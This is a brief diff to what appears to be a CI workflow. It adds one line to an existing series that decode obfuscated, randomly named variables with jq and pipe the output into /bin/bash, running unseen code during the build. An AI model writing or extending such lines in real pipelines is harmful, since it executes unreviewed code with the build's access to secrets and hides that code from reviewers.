@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$ytrhf348" | jq -r .ch53 | /bin/bash
           echo $ff7724 | jq -r .kna7 | /bin/bash
           echo $mpa615 | jq -r .lridw9606 | /bin/bash
+          echo $sgioa6090 | jq -r .anxtf6 | /bin/bash
 
       - name: Save archive
         if: always()
